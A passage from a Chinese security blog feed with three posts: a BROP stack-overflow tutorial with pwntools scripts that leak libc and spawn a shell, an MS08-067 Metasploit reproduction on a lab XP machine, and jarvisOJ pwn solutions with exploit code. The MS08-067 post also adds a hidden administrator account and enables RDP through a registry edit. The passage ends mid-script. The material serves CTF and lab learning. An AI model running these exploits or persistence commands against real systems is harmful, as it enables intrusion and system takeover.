rsi  ##rsi</span><br><span class="line">   0x4006b2 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x4006b4 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">   0x4006b5:data16 nop WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x4006c0 &lt;__libc_csu_fini&gt;:repz ret </span><br><span class="line">gdb-peda$ x/5i 0x00000000004006AA+9</span><br><span class="line">   0x4006b3 &lt;__libc_csu_init+99&gt;:pop    rdi  ##rdi</span><br><span class="line">   0x4006b4 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">   0x4006b5:data16 nop WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x4006c0 &lt;__libc_csu_fini&gt;:repz ret </span><br><span class="line">   0x4006c2:add    BYTE PTR [rax],al</span><br></pre></td></tr></table></figure><p>可以用ROPgadget进行验证</p><p><img alt="" data-src="/2019/07/02/PWN学习之中级ROP/1.JPG" class="lazyload"></p><h3 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h3><p>以2016hctf的出题人失踪为例。攻击思路</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、确定栈溢出长度</span><br><span class="line">2、寻找stop_gadget</span><br><span class="line">3、识别brop_gadget</span><br><span class="line">4、确定puts@plt地址</span><br><span class="line">5、泄露puts@got地址</span><br><span class="line">6、根据puts@got的地址泄露出puts的地址，然后找到对应的libc，最后确定system和/bin/sh的地址</span><br></pre></td></tr></table></figure><h4 id="确定栈溢出长度"><a href="#确定栈溢出长度" class="headerlink" title="确定栈溢出长度"></a>确定栈溢出长度</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbufferflow_length</span><span class="params">()</span>:</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p = process(<span class="string">"./brop"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"WelCome my friend,Do you know password?\n"</span>)</span><br><span class="line">p.send(i*<span class="string">'a'</span>)</span><br><span class="line">output = p.recv()</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">"No password"</span>):</span><br><span class="line"><span class="keyword">return</span> i<span class="number">-1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">i = i+<span class="number">1</span></span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line">length = getbufferflow_length()</span><br><span class="line"><span class="keyword">print</span> length</span><br></pre></td></tr></table></figure><p>length = 72。同时，根据回显信息可以发现程序并<strong>没有开启 canary 保护</strong>，否则，就会有相应的报错内容。所以我们不需要执行 stack reading。</p><h4 id="寻找stop-gadget"><a href="#寻找stop-gadget" class="headerlink" title="寻找stop_gadget"></a>寻找stop_gadget</h4><p>stop_gadget不会使程序崩溃，即某一程序开始的地址</p><p>在程序还没有开启 PIE 保护的情况下，0x400000 处为 ELF 文件的头部，其内容为 \ x7fELF。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stop_addr</span><span class="params">(length)</span>:</span></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p = process(<span class="string">"./brop"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"password?\n"</span>)</span><br><span class="line">payload = length * <span class="string">'a'</span> + p64(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"one success addr: 0x%x"</span> %(addr)</span><br><span class="line"><span class="keyword">return</span> addr</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">addr += <span class="number">1</span></span><br><span class="line">p.close()</span><br><span class="line">length = <span class="number">72</span></span><br><span class="line">stop_gadget = get_stop_addr(length)</span><br></pre></td></tr></table></figure><p>有不少满足的的地址，这里选择近似main函数的 0x4006b6</p><h4 id="识别brop-gadget"><a href="#识别brop-gadget" class="headerlink" title="识别brop_gadget"></a>识别brop_gadget</h4><p>这里需要rdi ret；因此brop_gadget可以为__libc_csu_init中gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_brop_gadget</span><span class="params">(length,stop_addr,addr)</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p = process(<span class="string">"./brop"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"password?\n"</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * length + p64(addr)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(stop_addr)+p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">content = p.recv()</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">print</span> content</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">'WelCome'</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_brop_gadget</span><span class="params">(length,addr)</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p = process(<span class="string">"./brop"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"password?\n"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*length+p64(addr)+p64(<span class="number">0</span>)*<span class="number">80</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">content = p.recv()</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_brop_gadget</span><span class="params">()</span>:</span></span><br><span class="line">addr = <span class="number">0x400740</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line"><span class="keyword">if</span> get_brop_gadget(length,stop_gadget,addr):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"possible brop gadget: 0x%x"</span>%(addr)</span><br><span class="line"><span class="keyword">if</span> check_brop_gadget(length,addr):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"success brop gadget: 0x%x"</span>%(addr)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">addr += <span class="number">1</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line">find_brop_gadget()</span><br></pre></td></tr></table></figure><p>brop_gadget = 0x4007ba，所以rdi_ret=brop_gadget+9</p><h4 id="确定puts-plt地址"><a href="#确定puts-plt地址" class="headerlink" title="确定puts@plt地址"></a>确定puts@plt地址</h4><p>在程序还没有开启 PIE 保护的情况下，0x400000 处为 ELF 文件的头部，其内容为 \ x7fELF。因此可以构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">72</span>+(rdi_ret)+p64(<span class="number">0x400000</span>)+p64(puts_plt)+p64(stop_gadget)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_addr</span><span class="params">(length,rdi_ret,stop_gadget)</span>:</span></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line">p = process(<span class="string">"./brop"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"password?\n"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*length + p64(rdi_ret) + p64(<span class="number">0x400000</span>)+p64(addr)+p64(stop_gadget)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">content = p.recv()</span><br><span class="line"><span class="keyword">if</span> content.startswith(<span class="string">'\x7fELF'</span>):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"find puts@plt addr: 0x%x"</span>%(addr)</span><br><span class="line"><span class="keyword">return</span> addr</span><br><span class="line">p.close()</span><br><span class="line">addr += <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">p.close()</span><br><span class="line">addr += <span class="number">1</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line">rdi_ret = <span class="number">0x4007ba</span>+<span class="number">9</span></span><br><span class="line">puts_plt = get_puts_addr(length,rdi_ret,stop_gadget)</span><br></pre></td></tr></table></figure><p>puts_plt = 0x400555</p><h4 id="泄露puts-got地址"><a href="#泄露puts-got地址" class="headerlink" title="泄露puts@got地址"></a>泄露puts@got地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(length, rdi_ret, puts_plt, leak_addr, stop_gadget)</span>:</span></span><br><span class="line">    sh = process(<span class="string">'./brop'</span>)</span><br><span class="line">    payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(</span><br><span class="line">        puts_plt) + p64(stop_gadget)</span><br><span class="line">    sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        data = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">try</span>: </span><br><span class="line">            data = data[:data.index(<span class="string">"\nWelCome"</span>)]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = data</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">""</span>:</span><br><span class="line">            data = <span class="string">'\x00'</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line">rdi_ret = <span class="number">0x4007ba</span>+<span class="number">9</span></span><br><span class="line">puts_plt = <span class="number">0x400555</span></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line">data = leak(length,rdi_ret,puts_plt,addr,stop_gadget)</span><br><span class="line"><span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">       <span class="keyword">continue</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       result += data</span><br><span class="line">   addr += len(data)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'code1'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(result)</span><br></pre></td></tr></table></figure><p>生成的文件code1用ida的binary形式打开，找到偏移为0x555处，按c查看汇编代码</p><p><img alt="" data-src="/2019/07/02/PWN学习之中级ROP/2.JPG" class="lazyload"></p><p>puts_got = 0x400000+0x201018 = 0x601018</p><h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><p>利用libcsearcher的时候打不通，只好调用本地libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"> </span><br><span class="line">length = <span class="number">72</span></span><br><span class="line">stop_gadget = <span class="number">0x4005c0</span></span><br><span class="line">rdi_ret = <span class="number">0x4007ba</span>+<span class="number">9</span></span><br><span class="line">puts_plt = <span class="number">0x400555</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./brop'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>*length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recvuntil(<span class="string">'\nWelCome'</span>,drop=<span class="keyword">True</span>)</span><br><span class="line">puts_addr = u64(data.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher('puts',puts_addr)</span></span><br><span class="line"><span class="comment">#libc_base = puts_addr - libc.dump('puts')</span></span><br><span class="line">log.success(<span class="string">'libc_base:0x%x'</span> %libc_base)</span><br><span class="line"><span class="comment">#system_addr = libc_base + libc.dump('system')</span></span><br><span class="line"><span class="comment">#binsh_addr = libc_base + libc.dump('str_bin_sh')</span></span><br><span class="line">payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img alt="" data-src="/2019/07/02/PWN学习之中级ROP/3.JPG" class="lazyload"></p>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MS08-067漏洞复现</title>
      <link href="/2019/06/26/MS08-067%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/06/26/MS08-067%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MS08-067漏洞是通过MSRPC over SMB通道调用Server服务程序中的NetPathCanonicalize函数时触发的，而NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中存在的逻辑错误，造成栈缓冲区可被溢出，而获得远程代码执行（Remote Code Execution）。</span><br><span class="line">                                         --摘自freebuf《MS08-067漏洞原理及详尽分析过程》</span><br></pre></td></tr></table></figure><p>这是一个十多年前的漏洞，MS08-067漏洞将会影响除Windows Server 2008 Core以外的所有Windows系统，包括：Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta。SMB（server massage block）在windows操作系统中是默认在139/445端口开放的，该协议主要用来共享文件等。基于该协议的漏洞也有不少，当然，ms08067是最有名的一个。</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击机：kali</span><br><span class="line">靶机：window xp sp3 (English)</span><br><span class="line">win7：用于远程连接</span><br></pre></td></tr></table></figure><p>对于靶机，一开始我用的是Windows server 2003 中文版。nmap扫描发现有该漏洞，但是用msf获取shell却一直失败。后来查资料发现，Windows server 2003 中文版的payload需要稍作修改。简单起见，我换了win xp sp3，最后成功获取shell。</p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>搭好环境后，进行主机发现，靶机ip：192.168.202.137</p><p><img alt="" data-src="/2019/06/26/MS08-067漏洞复现/3.JPG" class="lazyload"></p><p>nmap扫描，查看开放哪些端口,发现139、445都开放</p><p><img alt="" data-src="/2019/06/26/MS08-067漏洞复现/4.JPG" class="lazyload"></p><p>继续nmap扫描，判断MS08067漏洞是否存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=smb-vuln-*.nse --script-args=unsafe=1 192.168.202.137</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/06/26/MS08-067漏洞复现/5.JPG" class="lazyload"></p><p>发现存在ms08-067漏洞，接下来用msf进行攻击</p><h3 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h3><p>打开msfconsole，查找该漏洞利用框架</p><p><img alt="" data-src="/2019/06/26/MS08-067漏洞复现/6.JPG" class="lazyload"></p><p>use exploit/windows/smb/ms08_067_netapi，然后选择payload</p><p><img alt="" data-src="/2019/06/26/MS08-067漏洞复现/7.JPG" class="lazyload"></p><p>show options查看参数，接下来设置参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rhost：靶机ip</span><br><span class="line">lhost：攻击机ip</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/06/26/MS08-067漏洞复现/8.JPG" class="lazyload"></p><p>exploit</p><p><img alt="" data-src="/2019/06/26/MS08-067漏洞复现/9.JPG" class="lazyload"></p><p>成功获取shell，接下来提权，步骤如下：</p><p>1、添加新用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user kangel 2314838574 /add</span><br></pre></td></tr></table></figure><p>2、添加新用户到管理员组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators kangel /add</span><br></pre></td></tr></table></figure><p>3、开放3389端口进行远程连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/06/26/MS08-067漏洞复现/10.JPG" class="lazyload"></p><p>查看端口</p><p><img alt="" data-src="/2019/06/26/MS08-067漏洞复现/11.JPG" class="lazyload"></p><p>用win7进行远程连接，首先检查能否ping通</p><p><img alt="" data-src="/2019/06/26/MS08-067漏洞复现/2.JPG" class="lazyload"></p><p>进行远程连接</p><p><img alt="" data-src="/2019/06/26/MS08-067漏洞复现/1.JPG" class="lazyload"></p><p>成功！</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>jarvisOJ解题记录之pwn</title>
      <link href="/2019/05/19/jarvisOJ%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bpwn/"/>
      <url>/2019/05/19/jarvisOJ%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bpwn/</url>
      
        <content type="html"><![CDATA[<h3 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h3><p>checksec,NX开启</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/1.JPG" class="lazyload"></p><p>ida查看程序</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/2.JPG" class="lazyload"></p><p>栈溢出，可以直接覆盖掉返回地址是程序直接执行callsystem函数从而拿到shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">tar = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">" 9881"</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x88</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line">tar.send(payload)</span><br><span class="line">tar.interactive()</span><br></pre></td></tr></table></figure><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>checksec，没有开启NX</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/3.JPG" class="lazyload"></p><p>IDA查看程序</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/4.JPG" class="lazyload"></p><p>栈溢出，由于没有开启NX，可以直接在栈中写入shellcode。栈的首地址程序会打印出来，所以直接接收</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9877"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level1"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf = p.recvline()[<span class="number">14</span>:<span class="number">-2</span>]</span><br><span class="line">buf = int(buf,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(buf)</span><br><span class="line">payload = shellcode.ljust(<span class="number">140</span>,<span class="string">'a'</span>) + p32(buf)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>checksec，开启了NX</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/5.JPG" class="lazyload"></p><p>IDA查看程序</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/6.JPG" class="lazyload"></p><p>栈溢出，调用系统函数执行“/bin/sh”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9878"</span>)</span><br><span class="line">system_addr = <span class="number">0x08048320</span></span><br><span class="line">bin_sh = <span class="number">0x0804a024</span></span><br><span class="line">payload = flat([<span class="number">140</span>*<span class="string">'a'</span>,system_addr,<span class="string">'aaaa'</span>,bin_sh])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="level2（x64）"><a href="#level2（x64）" class="headerlink" title="level2（x64）"></a>level2（x64）</h3><p>IDA查看程序</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/25.JPG" class="lazyload"></p><p>与上一题基本相同，需要注意的是64位程序与32位函数传参的不同。</p><p>32位：函数参数直接入栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_addr-&gt;ret_addr-&gt;参数n-&gt;参数n-1...</span><br></pre></td></tr></table></figure><p>64位：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前六个参数按顺序存储在寄存器rdi, rsi, rdx, rcx, r8, r9中</span><br><span class="line">数超过六个时，从第七个开始压入栈中</span><br></pre></td></tr></table></figure><p>这里调用system只需要一个参数“/bin/sh”，将它的地址填入rdi中即可。需要一次gadget</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/24.JPG" class="lazyload"></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> 